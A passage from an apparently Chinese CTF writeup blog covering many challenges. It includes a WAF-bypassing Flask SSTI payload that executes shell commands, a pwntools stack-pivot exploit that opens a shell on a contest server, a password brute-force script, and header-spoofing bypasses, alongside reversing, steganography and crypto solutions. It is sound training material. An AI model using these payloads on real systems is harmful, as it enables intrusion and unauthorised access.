flask，我们推断出来这是一道SSTI注入题目。</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/830a55042e409db0ac9fb73c14ed4f59.png)</span>\n\n<span style=\"font-size: 12pt\">然后题目要求url的结尾必须以.js结尾。所以我们可以构造一个注入语句来判读框架。</span>\n\n<span style=\"font-size: 12pt\">/admin?name={{7 * 7}}&a=.js?</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/842121dcff69a9191fa9fdbb752585aa.png)</span>\n\n<span style=\"font-size: 12pt\">果然，不出所料，这道题目属于 Flask SSTI 模板注入，在对网页后端的WAF进行爆破后，我们发现我们常用的__globlas__，__init__，等寻常的函数都被WAF了。</span>\n\n<span style=\"font-size: 12pt\">但是我们可以用另一种方法，那就是利用python内置的attr函数啦进行十六进制转字符串并且执行函数，用()来代替[]，用attr来实现函数功能。</span>\n\n<span style=\"font-size: 12pt\">Payload:</span>\n\n<span style=\"font-size: 12pt\">admin?name=`{{(test'attr(\"\\x5f\\x5f\\x69\\x6e\\x69\\x74\\x5f\\x5f\")'attr(\"\\x5f\\x5f\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x5f\\x5f\")'attr(\"\\x67\\x65\\x74\")(\"\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\")'attr(\"\\x67\\x65\\x74\")(\"\\x65\\x76\\x61\\x6c\")(\"\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\\x28\\x22\\x6f\\x73\\x22\\x29\\x2e\\x70\\x6f\\x70\\x65\\x6e\\x28\\x22\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\\x22\\x29\\x2e\\x72\\x65\\x61\\x64\\x28\\x29\"))}}`&a=.js?</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/f6ba48331044c5b78c21aa29f36c4f77.png)</span>\n\n<span style=\"font-size: 12pt\">然后就可以得到flag。</span>\n\n<span style=\"font-size: 12pt\">FLAG值：flag{81ede5b11793556e2f311b010ed3b34b}</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\"><span style=\"font-size: 12pt;font-weight: bold\">题目九cute_doge</span></span>\n\n<span style=\"font-size: 12pt\">作为一个逆向狗，无论什么exe都想点一点。看到题目，我们打开之后，并没有特别的提示，只有一只 cute_doge</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/0a25db44ee0936ca0f0795535ff8e30b.png)</span>\n\n<span style=\"font-size: 12pt\">并且在点击图片（按钮）之后会提示\"我说flag在这里，你信吗？\"字样。于是我们按照惯例，对软件进行分析。</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/5f4cda3935c6d23dba59e339ea9a1f30.png)</span>\n\n<span style=\"font-size: 12pt\">在确定是64位系统软件之后，我们就可以使用IDA来对软件进行静态分析。</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/8661391b8928b1e9fa4841ce2618a194.png)</span>\n\n<span style=\"font-size: 12pt\">在对软件内的字符串进行从上到下的分析时，我们发现有一串类似于base64加密的字符串，别问，问就是杂项手的第六感。</span>\n\n<span style=\"font-size: 12pt\">果不其然，在解密后我们得到flag</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/7fd7d939785c59a979f5a785d2c85d79.png)</span>\n\n<span style=\"font-size: 12pt\">FLAG值：flag{Ch1na_yyds_cazy}</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\"><span style=\"font-size: 12pt;font-weight: bold\">题目十无字天书</span></span>\n\n<span style=\"font-size: 12pt\">这道题目属实有一点偏门，但是身为一个杂项人，搜索能力当然是最重要的。</span>\n\n<span style=\"font-size: 12pt\">题目给了我们一个 key.ws 和一个 flag.txt，其中的内容都是有空格 连接符 - 和 Tab号组成的密文，观察 flag.txt ，发现明显是由 snow 加密过后的 flag</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/cc10d9e3874ca1c91f3793263b0e374a.png)</span>\n\n<span style=\"font-size: 12pt\">但是解密 snow 需要密钥，那么我们在看到 key.ws 只有空格和连接号和Tab组成并且没有明显的分隔符，那么经过一番搜索，最后确定了是 white-space 隐写。</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/164c8e881900b0babe60fa0770d9b833.png)</span>\n\n<span style=\"font-size: 12pt\">我们成功拿到Key之后，就可以用Snow 解密工具对flag进行解密了。</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/ecde1ebcf8b25784e7f661d4e89bfd64.png)</span>\n\n<span style=\"font-size: 12pt\">FLAG值：cazy{C4n_y0u_underSt4nd_th3_b0oK_With0ut_Str1ng}</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\"><span style=\"font-size: 12pt;font-weight: bold\">题目十一 binary</span></span>\n\n<span style=\"font-size: 12pt\">这道题目给了我们一个234文件，在我们不清楚文件类型的情况下，我们可以使用Winhex来分析文件的文件头，从而确定文件的文件类型。</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/f9841613d266c80e04e81595d561e074.png)</span>\n\n<span style=\"font-size: 12pt\">通过分析文件头 CAFEBABE 我们可以知道这是一个 java 的 .class 文件，知道文件类型之后，我们就可以对文件进行反编译了。我的做法是直接扔到 IDEA 里面进行反编译。</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/5b859d438d5391c3dadbf22fefb1bdb8.png)</span>\n\n<span style=\"font-size: 12pt\">分析文件后，我们发现主函数 Main 下有一个数组，且里面的字符很像我们日常使用的ACSII编码。我们将字符进行提取并且解码。</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/e2f17bdf46a84a9e7a82ac0be1a29f1b.png)</span>\n\n<span style=\"font-size: 12pt\">得到文件后，熟悉Base64的CTFer就知道是0和1的编码了。放到在线网站base64.us种解密后得到我们所需要的数据。</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/d6d981dd43ba4bcdd55cb84be9521841.png)</span>\n\n<span style=\"font-size: 12pt\">解码后，我们发现这是由一个一组由37个数据并且分37组所组成的二进制，当我们将二进制分行显示时，便发现二进制的排序从某种角度来说很像二进制。</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/f8357e39f1747ed98a932706d2b4c50a.png)</span>\n\n<span style=\"font-size: 12pt\">为了验证我们的猜想，我们将1替换为白色方格，将0替换为黑色方格。然后显示字符串。</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/6251860405b1f6eef69d5eb0fd3243c8.png)</span>\n\n<span style=\"font-size: 12pt\">所幸，我们的猜想是正确的，通过扫描二维码我们也是成功的获取到了flag。</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/36e3ec34fd4b9fd1354a7b3c2c316e3e.png)</span>\n\n<span style=\"font-size: 12pt\">FLAG值：flag{932b2c0070e4897ea7df0190dbf36ece}</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\"><span style=\"font-size: 12pt;font-weight: bold\">题目十二 hello_py</span></span>\n\n<span style=\"font-size: 12pt\">这道题目，我们直接利用在线的pyc转py的网站，将题目所给的pyc文件转为可读的py文件。</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/d8b79a99a870700c13ed3fb197b2d547.png)</span>\n\n<span style=\"font-size: 12pt\">根据python文件所给的整体逻辑，我们分析题目需要我们输入一个flag，然后进行加密，对已经加密过的Happy数列进行比较。</span>\n\n<span style=\"font-size: 12pt\">然后我们发现存在两个加密函数 encode_1 和 encode_2 ，但是他们并不是一起工作的，而是有线程 t1 先启动，然后线程 t2 再启动。组成一个双加密。</span>\n\n<span style=\"font-size: 12pt\">分析 encode_1 函数，是将 flag 于 奇数位进行异或加密， encode_2 函数则是于 偶数位进行异或加密。注意他们的加密方式虽然相同但是加密的偏移量不同。</span>\n\n<span style=\"font-size: 12pt\">然后我们就可以逆向推导出解密过程。</span>\n\n    (chr(112 ^ 9) + chr(10 ^ 112) + chr(102 ^ 7) + chr(5 ^ 102) + chr(90 ^ 5) + chr(106 ^ 90) + chr(50 ^ 3) + chr(3 ^ 50) + chr(100 ^ 1) + chr(44 ^ 100))[::-1]\n    =>'He110_cazy'\n\n<span style=\"font-size: 12pt\">FLAG值: He110_cazy</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\"><span style=\"font-size: 12pt;font-weight: bold\">题目十三 Ez_Steg</span></span>\n\n<span style=\"font-size: 12pt\">题目附件如下：</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/6f2f68a0c9db654995cf427f726539a9.png)</span>\n\n<span style=\"font-size: 12pt\">压缩包提示说密码是6位数字</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">直接用bandizip自带的密码破解 很快啊，只要一秒啊</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/9988674343f624fb3fdf3aa522106fbd.png)</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">得到密码为220101</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">解压成功后 得到emjio.txt 和一个pyc文件</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">先看emoji密码</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/e02ac7c0765c7784de182e88c0e38c83.png)</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">先试了试base100 无果，题目还给了一个pyc 需要密钥的emoji加密 猜想到了emoji-aes加密</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">再看pyc文件 我第一时间是将其反编译uncompyle6 -o key.py steg.pyc</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">Python文件如下：</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/8fc5f238ff31b8a0ba35d6dac93a811a.png)</span>\n\n<span style=\"font-size: 12pt\">这里我卡了很久 这程序跟我们要的密钥也没关系呀。。所以我这边就放了放 后面突然想起来了pyc也能作为一种隐写。</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">这里是剑龙隐写Stegosaurus 脚本github可下</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">Python stegosaurus.py -x steg.pyc</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/55849d2b4b0bcf4e6b83e44b584f0a53.png)</span>\n\n<span style=\"font-size: 12pt\">得到了key St3g1sV3ryFuNny</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">最后用emoji-aes解码 一把梭！ [https://aghorler.github.io/emoji-aes/](https://aghorler.github.io/emoji-aes/)</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/860c2949a1231e695806d4f3ad7064fd.png)</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/043bb194a2d11c928007f4e35de6dc72.png)</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">FLAG值: cazy{Em0j1s_AES_4nd_PyC_St3g_D0_yoU_l1ke}</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\"><span style=\"font-size: 12pt;font-weight: bold\">题目十四 no_math_no_cry</span></span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">这道题目比较小，所以我们直接来看 sec_encry(m) 这个函数。c 是该函数加密flag后得到的值</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/680e543368777f60de4aabca224c4ec7.png)</span>\n\n<span style=\"font-size: 12pt\">根据他的加密过程，我们可以反向推导解密脚本，但是我们在编写脚本的时候要注意，因为他限制了flag的长度不能超过80，那么经过bytes_to_long变成数字的flag 再减去 1<<500(3273390607896141870013189696827599152216642046043064789483291368096133796404674554883270092325904157150886684127560071009217256545885393053328527589376)之后，很有可能是负数。而负数的平方又是正数。以下是解密脚本</span>\n\n    #!/usr/bin/python3\n    from gmpy2 import iroot\n    from Crypto.Util.number import long_to_bytes as l2b\n    c = 10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169\n    c1 = c - 0x0338470\n    c2 = iroot(c1,2)[0]\n    c3 = -c2 + (1<<500)\n    print(l2b(c3))\n    =>b'cazy{1234567890_no_m4th_n0_cRy}'\n\n<span style=\"font-size: 12pt\">FLAG值:cazy{1234567890_no_m4th_n0_cRy}</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\"><span style=\"font-size: 12pt;font-weight: bold\">题目十五 pwn1</span></span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/8e02a4f8cf367f22b54e038dd6f2b642.png)</span>\n\n<span style=\"font-size: 12pt\">32位程序 IDA分析：</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/64508def49525b4a2ec64f5b77e32e08.png)</span>\n\n<span style=\"font-size: 12pt\">显然的栈溢出 shift+f12 看字符串 发现还给了后门：</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/051ca26752a1c909dae8af94b1c1d4d9.png)</span>\n\n<span style=\"font-size: 12pt\">这道本让我以为很简单的题目我却做了很久 栈溢出 后门，没想到不是那么简单</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">（原本的payload）</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/27c918385f7f686feb43484ebb711d71.png)</span>\n\n<span style=\"font-size: 12pt\">结果没打通</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/1bdf017a6c4d6dfd731932c1bb069672.png)</span>\n\n<span style=\"font-size: 12pt\">后来搞了很久 想了一下题目还给了buf的地址 再看汇编</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/d1096f7b385d545c202793da1b3ab415.png)</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">那么是不是可以把/bin/sh写进buf的地址 然后把地址覆盖 最后拿到shell</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">实际上我们要找到binsh的地址 然后再填充一些垃圾字符 最后再将buf的地址覆盖 因为最后lea那里减去了4 所以最后还要补一个+4</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">其实不是栈溢出 而是栈迁移。</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">先用接受buf的地址</span>\n\n    r.recvuntil('Gift:')\n    bufaddr = eval(r.recv().strip())\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/86c95cabef33c02886335337d034d9a7.png)</span>\n\n<span style=\"font-size: 12pt\">这里找到后门地址为0x8048540</span>\n\n<span style=\"font-size: 12pt\">所以最终payload是</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n    payload = p32(binsh_addr) + b'a'*48 + p32(bufaddr+4)\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/4d13f597302f03fc6d0601321dcd189e.png)</span>\n\n<span style=\"font-size: 12pt\">打通：</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/96b58404f4de909b040ef757afc1beb1.png)</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n    from pwn import *\n\n    context.log_level='debug'\n    r = remote('113.201.14.253',16088)\n    r.recvuntil('Gift:')\n    bufaddr = eval(r.recv().strip())\n    print('[+]%s'%hex(bufaddr))\n    binsh_addr = 0x08048540\n    payload = p32(binsh_addr) + b'a'*48 + p32(bufaddr+4)\n    r.sendline(payload)\n    r.interactive()\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">FLAG值：flag{474b7f9219effe69530da4ad63c1752a}</span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\"><span style=\"font-size: 12pt;font-weight: bold\">题目十六LinearEquations</span></span>\n\n<span style=\"font-size: 12pt\"></span>\n\n<span style=\"font-size: 12pt\">拿到题目之后。通过观察题目。我们可以发现题目主要分为3大块，第一块就是开头的限制函数 assert，通过这里我们可以得到很多信息。比如flag的长度为24位。</span>\n\n<span style=\"font-size: 12pt\">第二块就是主要的加密块了，我们可以发现通过 __init__() 来初始化 class类，并且传递了两个值，就是 seed1 和 seed2，并且将flag 分为了3份，由 flag[:8] flag[8:16] flag[16:]组成，每一部分8个字符。并且8个字符转为数字后不能比n大。</span>\n\n<span style=\"font-size: 12pt\">第三块就是我们的主进程了。进程通过getRandomInteger(64)来向函数中传递了两个seed的值。并且返回了由 my_LCG().next()中产生的5个seed。</span>\n\n<span style=\"font-size: 12pt\">![](http://cdn.anyiblog.top/common/98d8a09a5f6bef6a4b0d2f12d00e5069.png)</span>\n\n<span style=\"font-size: 12pt\">由函数推理得知，seed3是由 seed1 和 seed2 推导产生。</span>\n\n<span style=\"font-size: 12pt\">具体的方程为 (flag1 * seed2 + flag2 * seed1 + flag3) % n</span>\n\n<span style=\"font-size: 12pt\">由此，我们可以推导出三条方程，结合题目的意思，就是线性方程组。</span>\n\n    flag1 * seed4 + flag2 * seed3 + flag3 mode n = seed5\n    flag1 * seed5 + flag2 * seed4 + flag3 mode n = seed6\n    flag1 * seed6 + flag2 * seed5 + flag3 mode n = seed7\n\n<span style=\"font-size: 12pt\">由此我们可以联立线性方程组，最后推出答案。</span>\n\n    flag1 = 5490290802446982981\n    flag2 = 8175498372211240502\n    flag3 = 6859390560180138873\n\n<span style=\"font-size: 12pt\">最后将flag转为字符串即可</span>\n\n<span style=\"font-size: 12pt\">FLAG值：cazy{L1near_Equ4t1on6_1s_34sy}</span>\n\n<span style=\"font-size: 12pt\"></span>","tags":["刷题","CTF"],"categories":["刷题笔记","Writeup"]},{"title":"融贯杯 writeup","url":"/2021/12/08/20211208/","content":"\n<span style=\"font-size: 18pt\">学长闲的没事干 给学弟出题 顺便给外校人员也做做 就诞生了本次的融贯杯</span>\n\n<span style=\"font-size: 18pt\"></span>\n\n<span style=\"font-size: 18pt\">然后我被拉过来出题 出了19道web和9道misc 写下我的解题思路</span>\n\n<span style=\"font-size: 18pt\"></span>\n\n<span style=\"font-size: 18pt\">整体难度不是很大 题目质量还可以，有些题目是搬运或者稍加修改。</span>\n\n<span style=\"font-size: 18pt\"></span>\n\n<span style=\"font-size: 18pt\">![](http://cdn.anyiblog.top/common/647abaf9898365f81d251f92f9ed9737.png)</span>\n<span style=\"font-size: 18pt\">![](http://cdn.anyiblog.top/common/145e5fa144448459f0692633d260c06f.png)</span>\n<span style=\"font-size: 18pt\"></span>\n\n<span style=\"font-size: 18pt\">WEB></span>\n\n<span style=\"font-size: 14pt\">1.代码的秘密</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/537e23055a79dfee2abfb9628aecea18.png)</span>\n<span style=\"font-size: 14pt\">题目如下：</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/612867703e3400a665638bb7237386da.png)</span>\n<span style=\"font-size: 14pt\">打开源码发现一段js代码</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/99d5a16bf42eee0764be62158bfffc76.png)</span>\n\n<span style=\"font-size: 14pt\">在本地运行js代码 获得flag</span>\n\n![](http://cdn.anyiblog.top/common/fb3e5519120821092569d714b7a0f602.png)\n<span style=\"font-size: 14pt\">2.本地访问</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/72252f5b120fd70cb1f5ab25f6ed125a.png)</span>\n<span style=\"font-size: 14pt\">题目如下：</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/72367e5a9529cf2868ab462781389612.png)</span>\n<span style=\"font-size: 14pt\">题目提示说要本地访问 因此想到用X-Forwarded-For构造ip</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/8b444b9be53bd7a7697e990e264b2d2b.png)</span>\n<span style=\"font-size: 14pt\">尝试访问后发现源代码：</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/4b2d22123e5ceec76eb7e541e1011789.png)</span>\n<span style=\"font-size: 14pt\">第一层绕过后 要求我们用User-Agent伪造admin</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/88f5723b86d500c606768530436fb8a2.png)</span>\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/31640b3ff099d80ef6c0b0960a9f00f1.png)</span>\n<span style=\"font-size: 14pt\">访问后绕过判断</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/fb9afc28a46a039d902e10bcea5ff84b.png)</span>\n<span style=\"font-size: 14pt\">这里要我们使用post传入参数password 当password为admin123时即可拿到flag</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/6d6afaac94068967045f972bd698f27a.png)</span>\n<span style=\"font-size: 14pt\">访问得到flag：</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/454b05b02682fc3ad70ae88983e0256a.png)</span>\n<span style=\"font-size: 14pt\">3.密码爆破</span>\n\n![](http://cdn.anyiblog.top/common/6365ff8f6e334c67532bb8e247c2b0f9.png)\n<span style=\"font-size: 14pt\">题目如下：</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/ae7c33d9d09d1aecda62a68aa649a8b4.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">结合题目提示要求我们爆破密码 并且密码为5位数字</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">这里可以用python写脚本 或者用 burpsuite 进行爆破 用burpsuite更快一点</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">python脚本如下：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/78f0d966ea6697a588cc65ce2c05b8e8.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n    import requests\n\n    def getpasswd():\n       ls = []\n       for i in range(10000,100000):\n          ls.append(i)\n       return ls\n\n    def flag():\n       url = \"http://47.96.153.252:28003/\"\n       for i in getpasswd():\n          data = {'password':i}\n          http=requests.post(url,data=data)\n          if \"密码错误\" in http.text:\n             print('[-]%s pass'%i)\n             pass\n          else:\n             print('[+]%s'%i)\n             break\n\n    flag()\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">burpsuite需抓包 然后进行Intruder爆破&nbsp;</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/41dfca93c3d02131b7f1f24221d47a5f.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">得到密码32767 解得即可。</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">4.运维失误</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/4dbfc15c8c8b7851e0fa05da98720dc9.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">题目如下：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/419649a1c4e096b2727e0bd1b949d3cf.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">进入题目发现无权访问 结合简介提示找网站备份文件 可以判断www.zip</span> [www.tar.gz](http://www.tar.gz/)<span style=\"font-size: 14pt\">&nbsp; robots.txt 等等。</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">输入www.zip发现备份文件</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/a24a56241d8f218e5a2aff7e68b7e977.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">得到源码文件</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">index.php：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/17dfd7b8ecc03dde1548ff96d21b5de7.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">这里要我们传入username和password参数 然后账号密码是不知道的 要经过md5验证才能拿到flag</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">再看74037e0c.php</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/1a7cf4ee300476527d09e6b70d54d917.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">得到账号密码 传入username和password即可拿到flag</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/c59eb3dd12f5b4988d3ddf3a5748213a.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">5.时间穿梭</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/bdc2c3bd8a3a59f64b42d121c483d53d.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">题目如下：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/81546abe1302e4b2b59222a7112e7aca.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">点击题目超链接 却被重定向到另一个页面</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/69f2105f0c44a1a6fa4e3d9aaed189f9.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">猜测题目用了header重定向 这里用burpstuie拦截</span>\n\n<span style=\"font-size: 14pt\">开启拦截 点击超链接</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/e6987efea834ccf3215cd4034b3e9682.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">发送到repeater</span>\n\n<span style=\"font-size: 14pt\">得到flag</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/48670933a27af127ffc1285d21a51f56.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">6.狡猾的前端</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/b88fd8a825a194350d1e616f6b7cd3e0.png)</span>\n<span style=\"font-size: 14pt\">题目如下：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/365829095c2b1ac34815b551f3c0bc5c.png)</span>\n<span style=\"font-size: 18.6667px\"></span>\n\n<span style=\"font-size: 18.6667px\">提示我们flag就在源码里 尝试用f12查看</span>\n\n<span style=\"font-size: 18.6667px\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/9deb88ca22716da3b4eb799d8e397a7b.png)</span>\n<span style=\"font-size: 18.6667px\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/804fa17c10f043ba3dc446f2a80b6fac.png)</span>\n![](http://cdn.anyiblog.top/common/3d696fb02d657b6938f1043d6de62f76.png)\n![](http://cdn.anyiblog.top/common/f05fe6be3a0c77dadb1d4a3a37fbbce3.png)\n![](http://cdn.anyiblog.top/common/95b1bec711572bcd75491f21d6cd3ffe.png)\n<span style=\"font-size: 14pt\">几乎能查看源码的键都被js过滤了 这里可以用postman查看</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/2b194373973740a00e75cfd55d68cc79.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">这里非预期解是可以通过多次按f12或者其他键 可以卡出源代码</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/ee9354004bfaf50e12be7a5624c090bb.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">7.Ez_Bypass</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/118efe9a82c71c333094c599d7ff4013.png)</span>\n<span style=\"font-size: 